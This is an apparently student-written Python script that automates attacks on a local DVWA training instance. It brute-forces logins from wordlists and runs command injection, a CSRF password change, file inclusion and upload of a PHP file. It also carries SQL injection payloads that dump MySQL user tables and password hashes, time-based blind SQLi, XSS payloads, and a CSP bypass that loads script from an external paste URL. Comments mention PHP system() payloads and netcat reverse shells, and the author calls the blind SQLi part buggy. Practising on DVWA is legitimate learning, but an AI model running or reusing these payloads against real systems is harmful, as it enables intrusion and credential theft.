import requests                 # for allowing us to send HTTP requests to server
import sys                      # for exit status of a request or operations
import re                       # for matching regular expressions numbers and strings to match it
from bs4 import BeautifulSoup   # for parsing web page
from codecs import encode       # for encoding with rot13
from hashlib import md5         # for hashing the encoded value from rot13
# Variables
target = 'http://127.0.0.1/DVWA'
sec_level = 'low'
dvwa_user = 'Admin'
dvwa_pass = 'password'
user_list = 'brute_force/user_list.txt'
pass_list = 'brute_force/pass_list.txt'



# Get the anti-CSRF token
def csrf_token():
    try:

        # Make the request to the URL
        print ("\n[i] URL: %s/login.php" % target)
        r = requests.get("{0}/login.php".format(target), allow_redirects=False)

    except:

        # Feedback for the user (there was an error) & Stop execution of our request
        print ("\n[!] csrf_token: Failed to connect (URL: %s/login.php).\n[i] Quitting." % (target))
        sys.exit(-1)


    # Extract anti-CSRF token
    soup = BeautifulSoup(r.text , features="lxml")
    user_token = soup("input", {"name": "user_token"})[0]["value"]
    print ("[i] user_token: %s" % user_token)


    # Extract session information
    session_id = re.match("PHPSESSID=(.*?);", r.headers["set-cookie"])
    session_id = session_id.group(1)
    print ("[i] session_id: %s" % session_id)

    return session_id, user_token

# Login to DVWA core
def dvwa_login(session_id, user_token):


    # POST data
    data = {
        "username": dvwa_user,
        "password": dvwa_pass,
        "user_token": user_token,
        "Login": "Login"
    }

    # Cookie data
    cookie = {
        "PHPSESSID": session_id,
        "security": sec_level
    }
    try:
        # Make the request to the URL
        print ("[i] Data: %s" % data)
        print ("[i] Cookie: %s" % cookie)
        r = requests.post("{0}/login.php".format(target), data=data, cookies=cookie, allow_redirects=False)
        

    except:
        # Feedback for the user (there was an error) & Stop execution of our request
        print ("\n\n[!] dvwa_login: Failed to connect (URL: %s/login.php).\n[i] Quitting." % (target))
        sys.exit(-1)


    # Wasn't it a redirect?
    if r.status_code != 301 and r.status_code != 302:
        # Feedback for the user (there was an error again) & Stop execution of our request
        print ("\n\n[!] dvwa_login: Page didn't response correctly (Response: %s).\n[i] Quitting." % (r.status_code))
        sys.exit(-1)


    # Did we log in successfully?
    if r.headers["Location"] != 'index.php':

        # Feedback for the user (there was an error) & Stop execution of our request
        print ("\n\n[!] dvwa_login: Didn't login (Header: %s  user: %s  password: %s  user_token: %s  session_id: %s).\n[i] Quitting." % (
          r.headers["Location"], dvwa_user, dvwa_pass, user_token, session_id))
        sys.exit(-1)


    # If we got to here, everything should be okay!
    print ("\n[i] Logged in! (%s/%s)\n" % (dvwa_user, dvwa_pass))
    return True

# Make the request to-do the brute force
def url_request(username, password, session_id):
    
    # GET data
    data = {
        "username": username,
        "password": password,
        "Login": "Login"
    }

    # Cookie data
    cookie = {
        "PHPSESSID": session_id,
        "security": sec_level
    }

    try:
        r = requests.get("{0}/vulnerabilities/brute/".format(target), params=data, cookies=cookie, allow_redirects=False)
    except:
        # Feedback for the user (there was an error) & Stop execution of our request
        print ("\n\n[!] url_request: Failed to connect (URL: %s/vulnerabilities/brute/).\n[i] Quitting." % (target))
        sys.exit(-1)

    # Was it a ok response?
    if r.status_code != 200:
        # Feedback for the user (there was an error again) & Stop execution of our request
        print ("\n\n[!] url_request: Page didn't response correctly (Response: %s).\n[i] Quitting." % (r.status_code))
        sys.exit(-1)
    # We have what we need
    return r.text

# Main brute force loop
def brute_force(session_id):
    
    print('\n\nVulnerability: Brute Force:\n')
    # Value to look for in response header (Whitelisting) # for the BruteForcing 
    success = 'Welcome to the password protected area'
    
    # Load in wordlists files
    with open(pass_list) as password:
        password = password.readlines()
    with open(user_list) as username:
        username = username.readlines()

    # Counter
    i = 0

    # Loop around
    for PASS in password:
        for USER in username:
            USER = USER.rstrip('\n')
            PASS = PASS.rstrip('\n')

            # Increase counter
            i += 1

            # Feedback for the user
            print ("[i] Try %s: %s // %s" % (i, USER, PASS))

            # Make request
            attempt = url_request(USER, PASS, session_id)
            # print (attempt)

            # Check response
            if success in attempt:
                print ("\n\n[i] Found!")
                print ("[i] Username: %s" % (USER))
                print ("[i] Password: %s" % (PASS))
                return True
    return False

# Print Vulnerability dirs all urls
def dirs(session_id, user_token):
    
    print('\n\nAll dirs as urls:\n')
    # POST data
    data = {
        "username": dvwa_user,
        "password": dvwa_pass,
        "user_token": user_token,
        "Login": "Login"
    }

    # Cookie data
    cookie = {
        "PHPSESSID": session_id,
        "security": sec_level
    }

    # Expands Dirs Names and there URL link
    resp = requests.get("{0}/index.php".format(target), data=data, cookies=cookie, allow_redirects=False)
    soup = BeautifulSoup(resp.content,"lxml")
    Dir_Lnk = soup.find_all("a", href=True)[3:17]
    count = 0
    for a in Dir_Lnk:
        count +=1
        print(str(count)+' '+"{0}/".format(target)+str(a['href']))

# Vulnerability: Command Injection 
def CMD_Inject(session_id, user_token):
    
    print('\n\nVulnerability: Command Injection:\n')
    # POST payload
    payload = {
        "ip":'127.0.0.1 -n 1',
        "Submit":"Submit"
    }

    # Cookie data
    cookie = {
        "PHPSESSID": session_id,
        "security": sec_level
    }
    
    # POST Method
    resp = requests.post("{0}/vulnerabilities/exec/".format(target),data=payload, cookies=cookie, allow_redirects=False)
    soup = BeautifulSoup(resp.text,"lxml")
    form = soup.find("pre")
    print(form.text)
    
# Vulnerability: Cross Site Request Forgery (CSRF)
def CSRF_Inject(session_id, user_token):
    
    print('\n\nVulnerability: Cross Site Request Forgery (CSRF):\n')
    # POST data
    data = {
    
        "username": dvwa_user,
        "password": dvwa_pass,
        "user_token": user_token,
        "Login": "Login"
    }
    
    # Cookie data
    cookie = {
        "PHPSESSID": session_id,
        "security": sec_level
    }
    
    # here will change the password of your current login info 
    payload = {
        "password_new":"password",
        "password_conf":"password",
        "Change": "Change"
    }
    
    resp = requests.get("{0}/vulnerabilities/csrf/".format(target),data=data, cookies=cookie,params=payload ,allow_redirects=False)
    soup = BeautifulSoup(resp.text,"lxml")
    form = soup.find("pre")
    print(form.text,"For the user Admin")
    
    # check info the new info
    payload2 = {
        "username":"Admin",
        "password":"password",
        "Login": "Login"
    }
    
    resp2 = requests.post("{0}/vulnerabilities/csrf/test_credentials.php".format(target),data=data, cookies=cookie , params=payload2, allow_redirects=False)
    soup = BeautifulSoup(resp2.text,"lxml")
    
    # this mean try login with the changed info and check..
    if soup == "Valid password":
        LoginSecced = soup.find("h3" ,{'class':"loginSuccess"})
        print(LoginSecced.text)
    if soup != "Valid password":
        LoginFails = soup.find("h3")
        print(LoginFails.text)

# Vulnerability: File Inclusion
def File_Inc(session_id, user_token):
    
    print('\n\nVulnerability: File Inclusion:\n')
    # Cookie data
    cookie = {
        "PHPSESSID": session_id,
        "security": sec_level
    }
    
    # POST data
    data = {
        "username": dvwa_user,
        "password": dvwa_pass,
        "user_token": user_token,
        "Login": "Login"
    }
    
    # our PAYLOAD
    # the vaulnable param is "page="
    # you can change the value of key 'page' to somthing els like '../../phpinfo.php'
    
    payload = {
        "page":"file4.php",
    }

    # ex: >> <?php system('more \..\..\DVWA\robots.txt'); ?>
    # ex: >> <?php system('ping 127.0.0.1'); ?>
    # sometimes you can have revshell with netcat
    
    resp = requests.get("{0}/vulnerabilities/fi/".format(target),data=data, cookies=cookie ,params=payload,allow_redirects=False)
    soup = BeautifulSoup(resp.text,'lxml')
    hr_tag = soup.find('div',{"class":"vulnerable_code_area"},"hr")
    print(hr_tag.text)

# Vulnerability: File Upload
def File_Up(session_id, user_token):
    
    print('\n\nVulnerability: File Upload:\n')
    # Cookie data
    cookie = {
        "PHPSESSID": session_id,
        "security": sec_level
    }
    
    # POST data
    data = {
        "username": dvwa_user,
        "password": dvwa_pass,
        "user_token": user_token,
        "Login": "Login",
    }
    
    # here we upload our php code and we exec the our ping command 
    files = { "uploaded":('ping.php',open('File_Up/ping.php','rb'),'image/jpeg'),"Upload":(None,"Upload"),}
    resp = requests.post("{0}/vulnerabilities/upload/".format(target),cookies=cookie,allow_redirects=False,files=files,data=data)
    soup = BeautifulSoup(resp.text,'lxml')
    vuln_tag = soup.find('div',{"class":"vulnerable_code_area"})
    print(vuln_tag.text)
    # run our ping.php code peacefully :-)
    req = requests.get("{0}/hackable/uploads/".format(target),cookies=cookie,allow_redirects=False,data=data)
    soup = BeautifulSoup(req.content,'lxml')
    files_lnk = soup.find_all("a", href=True)[3:17]
    # show me the files inside the path '/hackable/uploads/'
    count = 0
    for a in files_lnk:
        count +=1
        print(str(count)+' '+"{0}/hackable/uploads/".format(target)+str(a['href']),"\n")
    # here our file and our req we print the content of our ping.php file on terminal
    print(requests.get("http://127.0.0.1/DVWA/hackable/uploads/ping.php",cookies=cookie).content,"\n")

# Vulnerability: SQL Injection
def SQL_Inject(session_id, user_token):
    
    print('\n\nVulnerability: SQL Injection:\n')
    # Cookie data
    cookie = {
        "PHPSESSID": session_id,
        "security": sec_level
    }
    
    # POST data
    data = {
        "username": dvwa_user,
        "password": dvwa_pass,
        "user_token": user_token,
        "Login": "Login",
    }
    
    # Note:
    # if you can't find any tables from the db dvwa use the information_schema to dump it for us ##
    print("\n++++++++++++++++\nShow Database Version: ...\n++++++++++++++++\n")
    count = 0

    # # Below we add false condition to make the other command to work which is >> 'union select null, @@version#'
    # # >> 'union'       to to combine two tables from different databases
    # # >> 'select null' mean combain all
    # # >> '#'           mean comment everything else 
    
    inj = [" db_version' and 1=0 union select null, @@version# \t"] 
    # show us the db name and ver
    for i1 in inj:
        count +=1
        payload1 = { "id":(None,i1),"Submit":(None,"Submit"),}
        resp1 = requests.get("{0}/vulnerabilities/sqli/".format(target),params=payload1,cookies=cookie,
        allow_redirects=False,data=data)
        soup1 = BeautifulSoup(resp1.content,'lxml')
        hr_tag1 = soup1.find_all("pre")
        for i2 in hr_tag1:
            print( ' '+resp1.url+"\n>>\n"+i2.text[67:99],"\n" )

    print("\n++++++++++++++++\nshow database path in the computer: .... \n++++++++++++++++\n")
    
    inj2 = ["data dir' and 1=0 union select null, @@datadir #"]
    
    # the trick is in >> data dir' and 1=0 is a false statment
    # so run this insted and comment everthing else >> union select null, @@datadir #
    # we use the >> 'null' bcz we want this to 'quory' from another coloms ;)

    for i2 in inj2:
        count +=1
        payload2 = { "id":(None,i2),"Submit":(None,"Submit"),} # our params
        resp2 = requests.get("{0}/vulnerabilities/sqli/".format(target),params=payload2,cookies=cookie,
        allow_redirects=False,data=data)
        soup2 = BeautifulSoup(resp2.content,'lxml')
        hr_tag2 = soup2.find_all("pre")
        for i3 in hr_tag2:
            print( ' '+resp2.url+"\n>>\n"+i3.text[63:200],"\n" )

    print("\n++++++++++++++++\nShow hostname name: .... \n++++++++++++++++\n")
    
    inj3 = ["name' and 1=0 union select null, @@hostname #"]
    for i3 in inj3:
        count +=1
        payload3 = { "id":(None,i3),"Submit":(None,"Submit"),} # our params
        resp3 = requests.get("{0}/vulnerabilities/sqli/".format(target),params=payload3,cookies=cookie,
        allow_redirects=False,data=data)
        soup3 = BeautifulSoup(resp3.content,'lxml')
        hr_tag3 = soup3.find_all("pre")
        for i4 in hr_tag3:
            print( ' '+resp3.url+"\n>>\n"+i4.text[60:200],"\n" ) # See the hostname of the server on the network in Surname:
            

    print("\n++++++++++++++++\nShow hosts names and what user belong to of mysql: .... \n++++++++++++++++\n")
    
    inj4 = ["user' and 1=0 union select null,concat(host,0x0a,user,0x0a,password) from mysql.user#"]
    for i4 in inj4:
        count +=1
        payload4 = { "id":(None,i4),"Submit":(None,"Submit"),} # our params
        resp4 = requests.get("{0}/vulnerabilities/sqli/".format(target),params=payload4,cookies=cookie,
        allow_redirects=False,data=data)
        soup4 = BeautifulSoup(resp4.content,'lxml')
        hr_tag4 = soup4.find_all("pre")
        for i5 in hr_tag4:
            print( ' '+resp4.url+"\n>>\n"+i5.text[100:200],"\n" )
    
    # >> 'concut' is for extracting cells or group them together 
    # >> 'host' mean the domain server ip localhost or extrnal ip
    # >> '0x0a' mean \n for new line 
    
    print("\n++++++++++++++++\nShow current database name: .... \n++++++++++++++++\n")
    inj5 = ["this data' and 1=0 union  select null, database()#"]
    for i5 in inj5:
        count +=1
        payload5 = { "id":(None,i5),"Submit":(None,"Submit"),} # our params
        resp5 = requests.get("{0}/vulnerabilities/sqli/".format(target),params=payload5,cookies=cookie,
        allow_redirects=False,data=data)
        soup4 = BeautifulSoup(resp5.content,'lxml')
        hr_tag5 = soup4.find_all("pre")
        for i6 in hr_tag5:
            print( ' '+resp5.url+"\n>>\n"+i6.text[65:200],"\n" )
             # in the Surname: .... db name

    print("\n++++++++++++++++\nShow all the tables and databases from information_schema: .... \n++++++++++++++++\n")
    inj6 = ["all tables' and 1=0 union select null,table_name from information_schema.tables#"]
    for i6 in inj6:
        count +=1
        payload6 = { "id":(None,i6),"Submit":(None,"Submit"),} # our params
        resp5 = requests.get("{0}/vulnerabilities/sqli/".format(target),params=payload6,cookies=cookie,
        allow_redirects=False,data=data)
        soup4 = BeautifulSoup(resp5.content,'lxml')
        hr_tag5 = soup4.find_all("pre")
        for i7 in hr_tag5:
            print( ' '+resp5.url+"\n>>\n"+i7.text[95:200],"\n" )
            # in the Surname: .... all the tables and databases from information_schema of the server is dumped :)

    print("\n++++++++++++++++\nShow all the columns of schema_name table dumped: .... \n++++++++++++++++\n")
    inj7 = ["all db' and 1=0 union select null,schema_name from information_schema.schemata#"]
    
    for i7 in inj7:
        count +=1
        payload7 = { "id":(None,i7),"Submit":(None,"Submit"),} # our params
        resp6 = requests.get("{0}/vulnerabilities/sqli/".format(target),params=payload7,cookies=cookie,
        allow_redirects=False,data=data)
        soup4 = BeautifulSoup(resp6.content,'lxml')
        hr_tag6 = soup4.find_all("pre")
        for i8 in hr_tag6:
            print( ' '+resp6.url+"\n>>\n"+i8.text[94:200],"\n" )
            # in the Surname: .... all the columns of schema_name table dumped :)

    print("\n++++++++++++++++\nShow table hosts parent db name : .... \n++++++++++++++++\n")

    # for example we use 'hosts' you can change that to any table you want to find where it belong to :)
    inj8 = ["tablemother' and 1=0 union select null, table_schema from information_schema.tables where table_name = 'hosts'#"]
    # schema_name is a table it's name is 'schema' inside the database 'information_schema' on table 'schemata'
    for i8 in inj8:
        count +=1
        payload8 = { "id":(None,i8),"Submit":(None,"Submit"),} # our params
        resp7 = requests.get("{0}/vulnerabilities/sqli/".format(target),params=payload8,cookies=cookie,
        allow_redirects=False,data=data)
        soup4 = BeautifulSoup(resp7.content,'lxml')
        hr_tag7 = soup4.find_all("pre")
        for i9 in hr_tag7:
            print( ' '+resp7.url+"\n>>\n"+i9.text[126:200],"\n" )
             # in the Surname: .... it belong for performance_schema

    print("\n++++++++++++++++\nShow any table contain user like from all information_schema tables: .... \n++++++++++++++++\n")
    inj9 = ["user in name' and 1=0 union select null, table_schema from information_schema.tables where table_name like 'user%'#"]
    for i9 in inj9:
        count +=1
        payload9 = { "id":(None,i9),"Submit":(None,"Submit"),} # our params
        resp8 = requests.get("{0}/vulnerabilities/sqli/".format(target),params=payload9,cookies=cookie,
        allow_redirects=False,data=data)
        soup4 = BeautifulSoup(resp8.content,'lxml')
        hr_tag8 = soup4.find_all("pre")
        for i10 in hr_tag8:
            print( ' '+resp8.url+"\n>>\n"+i10.text[130:200],"\n" )

    print("\n++++++++++++++++\nShow tables of dvwa database: .... \n++++++++++++++++\n")
    
    inj10 = ["all tables from db' and 1=0 union select null, table_name from information_schema.tables where table_schema = 'dvwa' #"]
    for i10 in inj10:
        count +=1
        payload10 = { "id":(None,i10),"Submit":(None,"Submit"),} # our params
        resp9 = requests.get("{0}/vulnerabilities/sqli/".format(target),params=payload10,cookies=cookie,
        allow_redirects=False,data=data)
        soup4 = BeautifulSoup(resp9.content,'lxml')
        hr_tag9 = soup4.find_all("pre")
        for i11 in hr_tag9:
            print( ' '+resp9.url+"\n>>\n"+i11.text[133:200],"\n"  )
            # in the Surname: .... tables: guestbook ,users 

    print("\n++++++++++++++++\nDump users and hashed password: .... \n++++++++++++++++\n")
    
    inj11 = ["all colons from users' and 1=0 union select null, concat(user,0x0a,password) from dvwa.users #"]
    for i11 in inj11:
        count +=1
        payload11 = { "id":(None,i11),"Submit":(None,"Submit"),} # our params
        resp10 = requests.get("{0}/vulnerabilities/sqli/".format(target),params=payload11,cookies=cookie,
        allow_redirects=False,data=data)
        soup4 = BeautifulSoup(resp10.content,'lxml')
        hr_tag10 = soup4.find_all("pre")
        for i12 in hr_tag10:
            print( ' '+resp10.url+"\n>>\n"+i12.text[110:200],"\n" )

# Vulnerability: Blind SQL Injection
def sqli_blind(session_id, user_token):
    
    print('\n\nVulnerability: SQL Injection (Blind):\n')
    # Cookie data
    cookie = {
        "PHPSESSID": session_id,
        "security": sec_level
    }
    
    # POST data
    data = {
        "username": dvwa_user,
        "password": dvwa_pass,
        "user_token": user_token,
        "Login": "Login",
    }

    # start req

    print("\n++++++++++++++++\nDB Length: ...\n++++++++++++++++\n")
    count = 0
    file1 = open('sqli_blind/DB/Gess_The_Length_DB.txt', 'r')
    Lines1 = file1.readlines()
    for length1 in Lines1:
        count +=1
        payload = { "id":(None,length1.strip()),"Submit":(None,"Submit"),}
        resp = requests.get("{0}/vulnerabilities/sqli_blind/".format(target),params=payload,cookies=cookie,
        allow_redirects=False,data=data)
        res = resp.elapsed.total_seconds() # Here we checking the time of response 
        if res >= 5: # if it is less than 5 second then discard it if it is equal to 5 or less then exec the command :)
            try:
                print('>> '+resp.url+"\n>> Len: "+str(count))
            except:
                pass

    print("\n++++++++++++++++\nDB Name: ...\n++++++++++++++++\n")
    count = 0
    inj1 = ["\t ' or 1=1 and substring(database(),1,5) = 'xdvwa' and sleep(5)# \t","\t ' or 1=1 and substring(database(),1,5) = 'dvwa' and sleep(5)# \t"]
    for i1 in inj1:
        count +=1
        payload1 = { "id":(None,i1.strip()),"Submit":(None,"Submit"),}
        resp1 = requests.get("{0}/vulnerabilities/sqli_blind/".format(target),params=payload1,cookies=cookie,
        allow_redirects=False,data=data)
        soup1 = BeautifulSoup(resp1.content,'lxml')
        res = resp1.elapsed.total_seconds()
        hr_tag1 = soup1.find("pre")
        if res >= 5:
            try:
                print('>> '+resp1.url+"\n"+">> DB: "+i1[30:109]+"\n>> Msg: "+ hr_tag1.text)
            except:
                pass

    print("\n++++++++++++++++\nTables count: ...\n++++++++++++++++\n")
    count = 0
    file3 = open('sqli_blind/Tables/GuessTablesCount.txt', 'r')
    Lines3 = file3.readlines()
    for length2 in Lines3:
        count +=1
        payload2 = { "id":(None,length2.strip()),"Submit":(None,"Submit"),}
        resp2 = requests.get("{0}/vulnerabilities/sqli_blind/".format(target),params=payload2,cookies=cookie,
        allow_redirects=False,data=data)
        soup1 = BeautifulSoup(resp2.content,'lxml')
        hr_tag2 = soup1.find("pre").text
        if hr_tag2 == 'User ID exists in the database.':
            print("\nTable counts: "+str(length2.split())[-8]) # this will print the inside tables in the db counts
    
    
    print("\n++++++++++++++++\nGuess Table character: ...\n++++++++++++++++\n")
    count = 0
    file4 = open('sqli_blind/Tables/GuessTablesLetter.txt', 'r')
    Lines4 = file4.readlines()
    for length3 in Lines4:
        count +=1
        payload3 = { "id":(None,length3.strip()),"Submit":(None,"Submit"),}
        resp3 = requests.get("{0}/vulnerabilities/sqli_blind/".format(target),params=payload3,cookies=cookie,
        allow_redirects=False,data=data)
        soup1 = BeautifulSoup(resp3.content,'lxml')
        hr_tag3 = soup1.find("pre").text
        if hr_tag3 == 'User ID exists in the database.':
            print("\nTable name letter: "+str(length3.split()[-1]))

    print("\n++++++++++++++++\nColumns Count: ...\n++++++++++++++++\n")
    count = 0
    file5 = open('sqli_blind/Columns/GuessColumnsCount.txt.txt', 'r')
    Lines5 = file5.readlines()
    for length4 in Lines5:
        count +=1
        payload2 = { "id":(None,length4.strip()),"Submit":(None,"Submit"),}
        resp2 = requests.get("{0}/vulnerabilities/sqli_blind/".format(target),params=payload2,cookies=cookie,
        allow_redirects=False,data=data)
        res2 = resp2.elapsed.total_seconds()
        if res2 >= 1.0: # if it is less than 1.0 second then discard it if it is equal to 1.0 or less then exec the command :)
            try:
                print('>> '+resp2.url+"\n>> Columns: "+length4[119:121])
            except:
                pass

    print("\n++++++++++++++++\nColumn first character: ...\n++++++++++++++++\n")
    count = 0
    file6 = open('sqli_blind/Columns/GuessColumnsLetter.txt', 'r')
    Lines6 = file6.readlines()
    for length5 in Lines6:
        count +=1
        payload2 = { "id":(None,length5.strip()),"Submit":(None,"Submit"),}
        resp2 = requests.get("{0}/vulnerabilities/sqli_blind/".format(target),params=payload2,cookies=cookie,
        allow_redirects=False,data=data)
        soup1 = BeautifulSoup(resp2.content,'lxml')
        hr_tag4 = soup1.find("pre").text
        if hr_tag4 == 'User ID exists in the database.':
            print("\nFirst Table name letter: "+str(length5.split()[-1]),"\n")
    '''
    Time-based blind annotation (using sleep () function to see if there is a significant delay in page returns)
    1' and sleep (5)# - Obvious delay / User ID is MISSING from the database
    1' and sleep (5)# - No delay / User ID exists in the database
    more seconds sleep will cause disconnection from server
    '''

# Vulnerability: Weak Session IDs
def weak_ID(session_id, user_token):
    
    print('\n\nVulnerability: Weak Session IDs:\n')
    # Cookie data
    cookie = {
        "PHPSESSID": session_id,
        "security": sec_level
    }
    

    # POST PAYLOAD
    payload = {
        "value":"Generate",
        'Referer': 'http://127.0.0.1/DVWA/vulnerabilities/weak_id/',
        'Cookie' : 'dvwaSession=0; PHPSESSID=o7er888al789255hq5psc9tptg; security=high' # the dvwaSession will incressed after you press generate 
    }

    # we can manuplate the Security Level level by the cookies 
    resp = requests.post("{0}/vulnerabilities/weak_id/".format(target),cookies=cookie,allow_redirects=False,data=payload)
    print(resp.headers)
    # print(resp.text)
    '''
    Security Level = before it was in Low mode now we change it to High from the headers 
    Username: Admin
    Security Level: high
    '''
    # clean the output
    soup = BeautifulSoup(resp.content,'lxml')
    p_tag = soup.find('div', id='system_info') # see the Security Level
    print(p_tag.text)

# Vulnerability: DOM Based Cross Site Scripting (XSS)
def xss_d(session_id, user_token):
    
    print('\n\nVulnerability: DOM Based Cross Site Scripting (XSS):\n')
    # Cookie data
    cookie = {
        "PHPSESSID": session_id,
        "security": sec_level
    }
    
    # POST data
    data = {
        "username": dvwa_user,
        "password": dvwa_pass,
        "user_token": user_token,
        "Login": "Login",
    }
    
    # POST PAYLOAD
    payload = {
        'default':'<script>document.write(document.domain)</script>', # after we exec the js code into the parametr 'default' on th url
                                                                      # it print the resualt into the first select tag of the page
                                                                      # i was planning to view the resut to see it in terminal 
                                                                      # showing the res of the payload -:
    }
    
    # start req
    resp =  requests.get("{0}/vulnerabilities/xss_d/".format(target),cookies=cookie,allow_redirects=False,data=data,params=payload)
    # print(resp.text)
    soup = BeautifulSoup(resp.content,'lxml')
    vuln_tag = soup.find("select")
    print(resp.url+"\n",vuln_tag)

# Vulnerability: Reflected Cross Site Scripting (XSS)
def xss_r(session_id, user_token):
    
    print('\n\nVulnerability: Reflected Cross Site Scripting (XSS):\n')
    # Cookie data
    cookie = {
        "PHPSESSID": session_id,
        "security": sec_level
    }
    
    # POST data
    payload = {
        "name": '<sCript>document.write(document.domain)</sCript>',
    }

    # start req
    resp =  requests.get("{0}/vulnerabilities/xss_r/".format(target),cookies=cookie,allow_redirects=False,params=payload)
    soup = BeautifulSoup(resp.content,'lxml')
    vuln_tag = soup.find("pre")
    print(resp.url+"\n",vuln_tag) # working

# Vulnerability: Stored Cross Site Scripting (XSS)
def xss_s(session_id, user_token):

    print('\n\nVulnerability: Stored Cross Site Scripting (XSS):\n')
    # Cookie data
    cookie = {
        "PHPSESSID": session_id,
        "security": sec_level
    }
    
    # POST data
    data1 = {
        "txtName": 'Done!',
        "mtxMessage": '<sCript>document.write(document.domain)</sCript>',
        "btnSign": "Sign Guestbook",
    }

    # start req
    resp =  requests.post("{0}/vulnerabilities/xss_s/".format(target),cookies=cookie,allow_redirects=False,data=data1)
    soup = BeautifulSoup(resp.content,'lxml')
    vuln_tag = soup.find_all("div",{"id":"guestbook_comments"})[-1]
    for tag in vuln_tag:
        print("\n",tag)

# Vulnerability: Content Security Policy (CSP) Bypass
def csp(session_id, user_token):

    print('\n\nVulnerability: Content Security Policy (CSP) Bypass:\n')
    # Cookie data
    cookie = {
        "PHPSESSID": session_id,
        "security": sec_level
    }
    
    # POST data
    data1 = {
        "include": 'https://www.toptal.com/developers/hastebin/raw/kaxoxudaxe', # better than pastebin
    }

    # start req
    
    resp =  requests.post("{0}/vulnerabilities/csp/".format(target),cookies=cookie,allow_redirects=False,data=data1)
    soup = BeautifulSoup(resp.content,'lxml')
    vuln_tag = soup.find('div', {"class":"vulnerable_code_area"}) 
    # you can see that we include it in the source code :)
    # <script src="https://www.toptal.com/developers/hastebin/raw/kaxoxudaxe"></script>
    res = resp.elapsed.total_seconds() 
    # Here we checking the time of response if it's NOT working great will it ill be fast
    if res <= 0.343:
        print("\n",vuln_tag,"\n",'\nworking Great\n')
    else:
        print('Not Working')

# Vulnerability: JavaScript Attacks
def javascript(session_id, user_token):
    
    print('\n\nVulnerability: JavaScript Attacks:\n')
    # Cookie data
    cookie = {
        "PHPSESSID": session_id,
        "security": sec_level
    }
    
    # encode the word 'success' to 'Rot-13' first & after that hash it with 'MD5':
    # the word "success" after encoding with 'rot_13' will be = "fhpprff"
    # let's do it:
    magicWord = "success"
    eMagicWord = encode(magicWord,'rot_13')
    token = md5(eMagicWord.encode('utf-8')).hexdigest()
    print("token= "+md5(eMagicWord.encode('utf-8')).hexdigest(),"\n")

    payload = {
        'token':token,      # our new token after encoding and hashing
        'phrase':'success', # our magic_word
        'send':'Submit'
        }    
    
    # start req
    resp =  requests.post("{0}/vulnerabilities/javascript/".format(target),cookies=cookie,allow_redirects=False,data=payload)
    soup = BeautifulSoup(resp.content,'lxml')
    
    # msg from dvwa
    p_tag1 = soup.find_all('p')[1] 
    for p in p_tag1:
        print("\n",p,"\n")

# Get initial CSRF token
session_id, user_token = csrf_token()

# Functions
dvwa_login(session_id, user_token)
dirs(session_id,user_token)
# Vulnerability: Low mode
brute_force(session_id)             # 1
CMD_Inject(session_id,user_token)   # 2
CSRF_Inject(session_id,user_token)  # 3
File_Inc(session_id,user_token)     # 4
File_Up(session_id, user_token)     # 5
SQL_Inject(session_id, user_token)  # 6 
sqli_blind(session_id, user_token)  # 7 buggy
weak_ID(session_id, user_token)     # 8
xss_d(session_id, user_token)       # 9
xss_r(session_id, user_token)       # 10
xss_s(session_id, user_token)       # 11
csp(session_id, user_token)         # 12
javascript(session_id, user_token)  # 13

# issues
#   1. Vulnerability: Insecure CAPTCHA : i skip it because it need API
#   2. Vulnerability: SQL Injection (Blind) : i try to inject it but i am not very good at SQL Injection yet..